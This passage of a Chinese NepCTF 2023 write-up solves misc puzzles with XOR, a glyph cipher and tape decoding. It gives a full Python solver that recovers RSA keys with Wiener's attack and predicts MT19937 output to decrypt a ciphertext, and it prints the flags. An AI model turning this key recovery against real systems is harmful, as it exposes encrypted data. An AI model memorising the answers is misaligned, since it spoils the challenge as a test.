src=\"/p/2023NepCTF/image-20230814104059226.png\" alt=\"image-20230814104059226\"></p>\n<p>直接出</p>\n<p>NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC</p>\n<h2 id=\"小叮弹钢琴\"><a href=\"#小叮弹钢琴\" class=\"headerlink\" title=\"小叮弹钢琴\"></a>小叮弹钢琴</h2><p>莫斯编码得到<code>YOUSHOULDUSETHISTOXORSOMETHING</code>，字面意思，你需要用这个xor，还有一段直接mid看</p>\n<p><img src=\"/p/2023NepCTF/image-20230814101009564.png\" alt=\"image-20230814101009564\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">x = <span class=\"number\">0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</span></span><br><span class=\"line\">xx = x.to_bytes(x.bit_length() // <span class=\"number\">8</span> + <span class=\"number\">1</span>, <span class=\"string\">&quot;big&quot;</span>)</span><br><span class=\"line\">key = <span class=\"string\">b&quot;YOUSHOULDUSETHISTOXORSOMETHING&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(xx)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(key), <span class=\"built_in\">len</span>(xx))</span><br><span class=\"line\"><span class=\"built_in\">print</span>((<span class=\"built_in\">bytearray</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> x: x[<span class=\"number\">0</span>] ^ x[<span class=\"number\">1</span>] ^ <span class=\"number\">32</span>, <span class=\"built_in\">zip</span>(xx, key)))))</span><br></pre></td></tr></table></figure>\n\n<p>大小写转换异或32</p>\n<h2 id=\"你也喜欢三月七么\"><a href=\"#你也喜欢三月七么\" class=\"headerlink\" title=\"你也喜欢三月七么\"></a>你也喜欢三月七么</h2><p>首先是用群名字sha256得到<code>dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009</code>取前面的16个字节</p>\n<p><img src=\"/p/2023NepCTF/image-20230814101534500.png\" alt=\"image-20230814101534500\"></p>\n<p>得到<a href=\"https://img1.imgtp.com/2023/07/24/yOkXWSJT.png\">https://img1.imgtp.com/2023/07/24/yOkXWSJT.png</a></p>\n<p><img src=\"/p/2023NepCTF/image-20230814101546437.png\" alt=\"image-20230814101546437\"></p>\n<p>一眼星穹铁道的文字</p>\n<p><img src=\"/p/2023NepCTF/efa6d5119c9f4eef31c7cdfea8d5312.png\" alt=\"efa6d5119c9f4eef31c7cdfea8d5312\"></p>\n<p>翻译可得</p>\n<p>HRP_aIways_likes_March_7th这里的aIways的I是大写的i</p>\n<h2 id=\"lic\"><a href=\"#lic\" class=\"headerlink\" title=\"lic\"></a>lic</h2><p>磁带信息，先用audiotap转磁带文件，再用010打开</p>\n<p><img src=\"/p/2023NepCTF/image-20230814101909845.png\" alt=\"image-20230814101909845\"></p>\n<p>可以看到文字的NepCTF形状，利用脚本反转之后可以看到</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;attachment.tap&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    data = f.read()[<span class=\"number\">50</span>:].strip(<span class=\"string\">b&quot;\\xa0&quot;</span>)</span><br><span class=\"line\">data = <span class=\"string\">b&quot;aaa&quot;</span> + data</span><br><span class=\"line\">chunk = <span class=\"number\">16</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"built_in\">len</span>(data), chunk):</span><br><span class=\"line\">    <span class=\"comment\"># print()</span></span><br><span class=\"line\">    x = data[i:i+chunk][::-<span class=\"number\">1</span>].decode(errors=<span class=\"string\">&quot;ignore&quot;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;&quot;</span>.join(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> _: <span class=\"string\">&quot;  &quot;</span> <span class=\"keyword\">if</span> _ == <span class=\"string\">&#x27;&gt;&#x27;</span> <span class=\"keyword\">else</span> _ + <span class=\"string\">&#x27; &#x27;</span>, x)))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"random-RSA\"><a href=\"#random-RSA\" class=\"headerlink\" title=\"random_RSA\"></a>random_RSA</h2><p>winner’s攻击，这里用了低指数解密算法的脚本<a href=\"https://github.com/pablocelayes/rsa-wiener-attack%EF%BC%8C%E6%81%A2%E5%A4%8Dd\">https://github.com/pablocelayes/rsa-wiener-attack，恢复d</a></p>\n<p>因为phi(n^2)近似(q^2-1)(p^2-1)，先用命令交互出一组数据，之后使用下面脚本爆破</p>\n<p>得到d之后</p>\n<p>因为$ed-1&#x3D;k(p^2-1)(q^2-1)&#x3D;k(p^2q^2-p^2-q^2+1)&#x3D;k(n^2-p^2-q^2+1)$</p>\n<p>所以可以利用$(ed-1+n^2)&#x2F;n$得到k</p>\n<p>之后一把梭求p，q即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> gcd, iroot</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hack_RSA</span>(<span class=\"params\">e, n</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    Finds d knowing (e,n)</span></span><br><span class=\"line\"><span class=\"string\">    applying the Wiener continued fraction attack</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class=\"line\">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (k, d) <span class=\"keyword\">in</span> convergents:</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># check if d is actually the key</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> k != <span class=\"number\">0</span> <span class=\"keyword\">and</span> (e * d - <span class=\"number\">1</span>) % k == <span class=\"number\">0</span>:</span><br><span class=\"line\">            phi = (e * d - <span class=\"number\">1</span>) // k</span><br><span class=\"line\">            s = n - phi + <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"comment\"># check if the equation x^2 - s*x + n = 0</span></span><br><span class=\"line\">            <span class=\"comment\"># has integer roots</span></span><br><span class=\"line\">            discr = s * s - <span class=\"number\">4</span> * n</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (discr &gt;= <span class=\"number\">0</span>):</span><br><span class=\"line\">                t = Arithmetic.is_perfect_square(discr)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> t != -<span class=\"number\">1</span> <span class=\"keyword\">and</span> (s + t) % <span class=\"number\">2</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Hacked!&quot;</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> d</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">attack</span>(<span class=\"params\">n, e</span>):</span><br><span class=\"line\">    d = hack_RSA(e, n * n)</span><br><span class=\"line\">    k = (e * d - <span class=\"number\">1</span> + n * n) // (n * n)</span><br><span class=\"line\">    tmp = (n * n) - ((e * d - <span class=\"number\">1</span>) // k) + <span class=\"number\">1</span> + <span class=\"number\">2</span> * n</span><br><span class=\"line\">    ppq = <span class=\"built_in\">int</span>(iroot(tmp, <span class=\"number\">2</span>)[<span class=\"number\">0</span>])</span><br><span class=\"line\">    tmp = (n * n) - ((e * d - <span class=\"number\">1</span>) // k) + <span class=\"number\">1</span> - <span class=\"number\">2</span> * n</span><br><span class=\"line\">    pmq = <span class=\"built_in\">int</span>(iroot(tmp, <span class=\"number\">2</span>)[<span class=\"number\">0</span>])</span><br><span class=\"line\">    p = <span class=\"built_in\">int</span>(gcd(ppq + pmq, n))</span><br><span class=\"line\">    q = n // p</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> p * q == n</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> e*d % ((p-<span class=\"number\">1</span>) * (q-<span class=\"number\">1</span>)) == <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> p, q, d</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ss = <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">9664150901450480967690564598017074925278657678428083526647019231493500227501186171121223353625264405549895808023865076405682104148869646937802710197692149880801739296224423720449697986562014962810427149274953670336431969720847239367252577312181797620406921597928891203908280967606801144879943997948288687269135451721341591758893489869339520600383114702594831680556978281938914417626897063741811649257614797234325708166759403120480173752153249168733044607204951768557734895758143808863754965572034240739588491294098941537522398891830128387438317592253663045532862058982832135946842401711673333170801808131328328138409</span></span><br><span class=\"line\"><span class=\"string\">22983334574580917801180860838975915911056113991786778412831201182411314364399816331219602816987801515703576764159087708450625423803558017646160341422267439951044407124414015864769966876129437519084492109510818093789724685834745254039500061544494687297354628168281982577957457924120597256869151402144742486005161738151255767127578010682514603747674732192539709537275806788688798050708598638377916842971631011263261195175705071683872373603843884113967910301479453532836470974019712063094982740534667039293541440015250164631599817949388195744930270131276498157477215483242544464596689268807389029069272532067490083369547669715239977992410158704220313287358936476570197236442784273557421888378497464433353892887766426339418782876390919046890278793088868131975197880580905027785352428189007480894687391277338836087221071379217489414415183919425962364501612704379275059469144794211736312560265881110693864711202763941138206607689382712402597791806706502788925221170513306681258576676019323627743632448114452443097397014141839634039981951855535241851424638689366379545342739319677785567174640217613527540438283508170772807801142587539976048845517400474132948151081974542377578704999265763979523387588936804746887912462709543565738342209411</span></span><br><span class=\"line\"><span class=\"string\">26421545185254987799905424190746332339125127121314171591428976353667115363763727486775614091903284658438097216623238914712478521157241139537987344330841699472419239411492271130318030306609434654284036687937944162679104946235126178521045633190386482424340322162024092955319660759058652161996411895209248718547013152501979160191126988501306653660575206430331327547695958573346502447806907651886805983227927733506487689107733064048662109346548423844168211328529388196436068858018422470472568131170937800147226367812703244919615304030171460050297573510835520868630853149705239212069246257510861666696541821151818169796199</span></span><br><span class=\"line\"><span class=\"string\">647587495710510972114742400831708548154715412535242193260921609695347930936707036639358968164012520349909437957090794941485190580257732521977171932341037504324231632999867734166481147062308183081010136684146530539354916263125020063213571051436518584206830118093755508481812082245822690944819197599760354341006609736609770789666793064642703641481389320623277678173558301629672865116377269127942025612180794827944539599815847863105760862109828389140681525680276554276533927094628602058843675286071339454429465986971694907927688830239142611855187274379851523189108755859657533224271693320278278605425423386495384174568562497627761612422045791957059437741493328698509481368554006456683812993984891378698935039540883929464645807942966456158605263661813471703445078327854656000079848297587266423318192874967873522951070558487797128927313745909508734015212545363132719971877683921675395438436594169300084386617636244174085949981341272801441913192529055922603538974179887610571219493524648953191928761783132985310317276631200614903232826609021472846793881344295699985919781942936761500592413666531213913327520376681809371295266029776133655277736129022073066033964950152867511761886746401418419578828754174047939112010456150675463575657509189</span></span><br><span class=\"line\"><span class=\"string\">10802012890829459540541628896792295078778436077857489427389981093725666739897304883046269390863878441152550000748160396908161524179907858077000487740264046477305439871796448601143325277932003810352123707096051383675738121180861345577006541031517155258339948241289482502904363911440323113072882087374540321696726636204227138558487828152291517517119224906926633391353300941778394425937626996455545868331674490267329118395561623628314372766364381142098697604044336132503664081692651614933878766623288150407771680698950374395680226687162951709227319486379639675961227436372862323642542582705252736363789548988448924281523</span></span><br><span class=\"line\"><span class=\"string\">83164181286675647518830286473660936842056768837605965773754722828164869255002601931877175384944967168423206258868966986144360226269117391889938003716473472419177908278255032274351977454805821764218411534787094767284216135276174354406996436906142025032430967949150772284199385705263345050808935420677789360168112630311736817620156906081165474809562107538852267394278439066621108665747312736533966159229107173152465365414052064089548384023025856375904149686916115214912086305308341266693329116385815754412736749978601321323191864143850174315828039788320203726197797788026323483995092501876361540056171546433345056509023822723392649116651071369395319931930221212866085340561430347693225966408351502938942294604586300299982831155358938495260400185484497256896416324370391657125309375755376057180940858375964786733652546488880996426657064631708252560023474877949301792612429382653730100520713338044964401333750090947037843448152614531864695601400078878276612572266304350518364495335341275038759497131064447619421326513680343303115330200681996349441238490209605256140282866353360785265474868465131016931425931964393177163140173169398499291572984733338118081910704432753107524477347843354958141041369207588577081612844623302487399941453933</span></span><br><span class=\"line\"><span class=\"string\">7896711153350680182046433804310163873530744638818895739714243668607588547792890005637528789452971314751693622472528149754510450552025972279187841776097749142749323304216218612718765727398943401294644022496938258864873262044174164494124912426175372524656376121897875690251938452930789747994519674300862595216275541928658146402252536829579922303097776404657455395450853161185534506599329499328761065707811197966475148318482438088816924842458585192796056395380885795831624193355572079389648572361687920747403086875781493091238221420792111039898275872964722825166960441004965842026859265796562573640732063541877035703999</span></span><br><span class=\"line\"><span class=\"string\">2453336941794377920668315851654619953646928905461467141099094168657719206064766651951427088886039685796776114141822989089619723777926424614857001633051068225552956142083890497598873667557028446871021184458240143729566494812770661669240646268836255291274950055880283884837660674102748619167688728015214974199172102739298082411466099956770246119223362727103493898761907722553589378295675272645561934551025890703140999463094569248990423646872411723328409457823533926161366175638210485154684713670484074111551184519212764546709551586814178654768531770178427218348159524090067132668379834207556749709109588553767744958928030458642933207972731738889836640270310522407082557073074220327314630716521374036182110178874650024321686921170512401592772523798249960102467660742850794643617416339049505280450162445401270432730440216281390479357051798091526529334107226924555476475287445348397336720445992548926807772402601594999910439716972523884323110378738095230641354005535939595738498325951885080299526970515488294162554370726438356887387936240973624985584430961461016270437469408900537013699409622145224578929157293051142754994365105441300293953769949427089080402762107252481674439414260001163630002002209227608718701864539764471854120765149</span></span><br><span class=\"line\"><span class=\"string\">934357599818997062963713308304362991596280828009512110755774617078887165360994483469754259794232045134748049571365890970600399733065188159532911208357285158307632045436603686477662110964558434302467120269827088523605436776745307435600233303494688594128265424710248665574421617599397235608386293736009112635240116363197127688715563025691804376760043956191129689115106451454594303458289356459242344139405236999049625726629507017505219076937886664753583057499783039263793580691707653961619033353122066993401993412281067305045569711817510917816670267012976388544311131447428560310255424118434372129058504068971704509583</span></span><br><span class=\"line\"><span class=\"string\">452535985385426610533595291636837260029529161119012527028832154063118066054114365212225611604413376466306821291622206453481076548722964431496720642815073434660316751461773927736769380260565572635521865666418131804097223787559572584034429232767907408588386908627811135292858626656533240022150603513420578118687227948584091074426900135895322629439907454314781910440178440833975308243442451505929901732597325250942477885257392248372956797459556418043140426549205059992693832494817312609114820874540542115879517751481239945773745036685837555782445189562031306229705420041083026014508308653365829010341657395972738383225136782775802242507679530114388408690163501378818581259836086658314750295168292063413234606975054845567353768299988855117672810051088400466976103022087953981820980574159918396071750775318139479271235473733328684536087473478158695154228827351532739332906517313798270187902326156179644850383883874005798210565002897279183014905697229418005561458301283927876097634598729273370887688127716799146589959547718296529504218197024144569252951455907047844555593109642331128337551457131825334129476995668564725114284200611621984522440766436051246003019078387721989410126014046300337526406832227661211670511374666171933242207761</span></span><br><span class=\"line\"><span class=\"string\">21636726262954983891798049753528884949149278107055957653804164122232750629108771687361858365462276461758050089339414649308189481865701469685971089624677686415038790141344992019067961279901006021154460525723482009962909666812029094177916225260557575750852951983028595026985975759287231315896982867941386247369741207715929550901277459410981688464120324580668604126829385737148142010733680106833740158713528050751799693988082141485112234559239865511692418065113774817308071898684749289577274638116406277808547134140659187860357703459236546455683700089064295899984063024669612762793525503212165546539776762359198804880143</span></span><br><span class=\"line\"><span class=\"string\">121831222096537368999356089708412896046021123796479990498164844552933248218587707868671273702871780046383065460423688141024214392817157791234305056319786064285936708392236448824783787802429682770337272235088202671105152535710294695902974253047704609221448981405609532633533062373004757059178427305919782441807444728003944125735197038228206500793881947731683045961796477046714111614358449413877923492947221540637411996522154279667079850899812790025430709528400798251289702825878302828745393493824877531623611021252456356175891394204733580270256164603165280954431866062942260146653644302782243197898971847034949620717936360716813922698249012591248773536863924987646374098897933678199676635398286431303649466386258192966901198806753276444091301228010214339088108290023638595922653691209504127688631013840850339138278703745938757018854197798962009892613282181507128330931048662067002367216863617848322567299023690624245593206164105677495564960539642415302357595708814138558968835481632687790665010565719903412940128287504825368916534220790908431745824689253975485426199665419413293026825301727942248672409218671101407001619695622271079059718159320809385046289813332457898242478875287662049306326128127096487004090260965504341859573161979</span></span><br><span class=\"line\"><span class=\"string\">5970296459863639263155783075172703907538560676961520474432385024839627916414414908656192009767702560571700661568202705725697718102111106038786955170270219508803648130754658135536335026559679753140733217830203813331793926165711104662514382832955840370630723176415927796955765169553517462286240424922177248496576208476937262840173500549507825256850681559103373575719799534073745792805709350898345377043444572387322205792026096379146084848266043619559701164699491546970266459037417312873294970955821603622312389603295515738649074112877256884131342394799593566008925579319817453597162465762851343362551362340193519234111</span></span><br><span class=\"line\"><span class=\"string\">18976399709138358912615581289803736063685392526627126047585536571255137591890898469016131796862155245718632726865355864471577906314641282253655270136097246496157189183315479252842675388863506996293537386049856520375327248649829502157752917745660189131281987348802723603782945921331000190785525591621756168923822951821404353646825235167866284344617268886872941218738132870839917479807740404673373159559070563008075098345562213387428585134527952927397372161736924000067060148836364979179350873731455181407191524960955000331041112836325967730682314802564504793245212062165765383998948417925582958872582993455246869810367559513521188245827564742949660925007994864642588404989913088438650029238240908588039032304578884090105469536379896758734713314973495243747985470691862911913134723349279860545443973275726615548263752591810660223834517909123784767147753948727361870320431446223866316111276171603492135128216357176021812643706643763587976997347084988208779018873039456862231395447809853586521609100405013300467752808797446255256509955396709060833818059140619116092459497493686455825427088609805918612964163855925495410440760559642006382819680630706627333218589739634830096224810601690036163130895447446190737732854075739908518171940791</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span>.strip().split()</span><br><span class=\"line\">arr = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"built_in\">int</span>, ss))</span><br><span class=\"line\">xx = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    n = arr[<span class=\"number\">2</span>*x]</span><br><span class=\"line\">    e = arr[<span class=\"number\">2</span>*x + <span class=\"number\">1</span>]</span><br><span class=\"line\">    xx.append(attack(n, e))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(xx)</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">global_bits = <span class=\"number\">1024</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> extend_mt19937_predictor <span class=\"keyword\">import</span> ExtendMT19937Predictor</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> p, q, d <span class=\"keyword\">in</span> xx:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(p &amp; <span class=\"number\">0xffffffff</span>), <span class=\"built_in\">hex</span>(q &amp; <span class=\"number\">0xffffffff</span>), <span class=\"built_in\">hex</span>(d &amp; <span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(p.bit_length(), q.bit_length(), d.bit_length())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(xx))</span><br><span class=\"line\"><span class=\"keyword\">for</span> xt <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span> ** <span class=\"number\">7</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        predictor = ExtendMT19937Predictor()</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> xt &amp; (<span class=\"number\">1</span> &lt;&lt; i):</span><br><span class=\"line\">                predictor.setrandbits(xx[i][<span class=\"number\">0</span>] &gt;&gt; <span class=\"number\">32</span>, global_bits - <span class=\"number\">32</span>)</span><br><span class=\"line\">                predictor.setrandbits(xx[i][<span class=\"number\">1</span>] &gt;&gt; <span class=\"number\">32</span>, global_bits - <span class=\"number\">32</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                predictor.setrandbits(xx[i][<span class=\"number\">1</span>] &gt;&gt; <span class=\"number\">32</span>, global_bits - <span class=\"number\">32</span>)</span><br><span class=\"line\">                predictor.setrandbits(xx[i][<span class=\"number\">0</span>] &gt;&gt; <span class=\"number\">32</span>, global_bits - <span class=\"number\">32</span>)</span><br><span class=\"line\">            predictor.setrandbits(xx[i][<span class=\"number\">2</span>] &gt;&gt; <span class=\"number\">32</span>, global_bits - <span class=\"number\">32</span> - <span class=\"number\">32</span>)</span><br><span class=\"line\">        <span class=\"comment\"># d = predictor.predict_getrandbits(global_bits - 32)</span></span><br><span class=\"line\">        <span class=\"comment\"># print(d)</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(xt)</span><br><span class=\"line\">        <span class=\"keyword\">del</span> predictor</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> next_prime, invert <span class=\"keyword\">as</span> inverse_mod</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> PKCS1_v1_5</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.PublicKey <span class=\"keyword\">import</span> RSA</span><br><span class=\"line\"><span class=\"keyword\">from</span> random <span class=\"keyword\">import</span> getrandbits</span><br><span class=\"line\"><span class=\"keyword\">from</span> math <span class=\"keyword\">import</span> lcm</span><br><span class=\"line\"><span class=\"keyword\">from</span> sys <span class=\"keyword\">import</span> exit</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_prime</span>(<span class=\"params\">bits: <span class=\"built_in\">int</span></span>):</span><br><span class=\"line\">    p = (predictor.predict_getrandbits(bits - <span class=\"number\">32</span>) &lt;&lt; <span class=\"number\">32</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> next_prime(p)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_private_key</span>(<span class=\"params\">bits: <span class=\"built_in\">int</span></span>):</span><br><span class=\"line\">    q, p = generate_prime(bits), generate_prime(bits)</span><br><span class=\"line\">    n, phi = p * q, lcm(p-<span class=\"number\">1</span>, q-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(p.bit_length(), q.bit_length())</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(p &amp; <span class=\"number\">0xffffffff</span>), <span class=\"built_in\">hex</span>(q &amp; <span class=\"number\">0xffffffff</span>))</span><br><span class=\"line\">    d = inverse_mod(<span class=\"number\">0x10001</span>, phi)</span><br><span class=\"line\">    privateKey = RSA.construct((<span class=\"built_in\">int</span>(n), <span class=\"built_in\">int</span>(<span class=\"number\">0x10001</span>), <span class=\"built_in\">int</span>(d), <span class=\"built_in\">int</span>(p), <span class=\"built_in\">int</span>(q)))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> privateKey, p &gt; q</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">privateKey, signal = generate_private_key(global_bits)</span><br><span class=\"line\">Cipher = PKCS1_v1_5.new(privateKey)</span><br><span class=\"line\">cc = <span class=\"string\">b&quot;\\x02\\x81\\xbe\\x9e^\\xdc2\\xf6V~\\x98 \\x97\\x125\\xa2-\\xe3gal\\x96\\x02\\xba\\xe8\\xaaN*\\xce\\xe98\\x8eAhSNz\\x08;Vb\\xe0\\x9d\\xe2\\x15\\xf6\\x12\\xd6\\xe5&#x27;a\\xc0\\rt\\r+\\xa4_\\xaa\\x19\\xc4\\x97&gt;\\xa1\\r\\x14\\x18\\xfe\\xd4\\xa8~d\\xfe\\x9d\\x95&gt;\\x0f\\x84\\xfa/p\\xfa\\x91\\x070\\xd1\\xa64\\xb2N\\x9a\\xe9\\x01\\xe9\\x91\\xa58\\x81\\xb2\\\\H&amp;B\\xcc\\xde\\xe8|\\x87\\xed\\x0e)\\xd3\\xde\\x93f\\xa5\\x0e\\xecv\\x9c\\xcea%\\x85\\x9e\\xb8\\x10\\x9ea\\xdfnME\\x18i\\xab,\\x96&#123;\\xab\\xf3i\\xa9I\\xc2\\xbb\\xac\\x81\\x12\\x04\\xf4J8N\\xfbE\\x0fp.P\\x9b\\xacrX\\xc1Hk\\xff-&gt;\\x9b\\xd99\\xd2L\\xc2\\x849*\\xfa\\xf3&gt;\\x8c&amp;23\\xceu\\xb7\\xf7\\xa2\\x81\\x15\\xacOX&#125;\\xd3t\\xa6T\\x1b7\\xa9\\xf6\\x163\\x96\\xa1\\xe1\\xd7\\xb3e\\xccB\\x9a\\xee\\x83B|\\x92E&gt;C\\xfb\\xd5\\xc5\\xe3#\\xa514\\xa0\\x1b\\x03\\xbf\\xf6\\xb3\\x1bK\\xa2=\\xaf3\\x03w\\x91\\xdeU\\xb51Y&#125;%\\x89\\x00&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(Cipher.decrypt(cc, <span class=\"literal\">None</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"simple-des\"><a 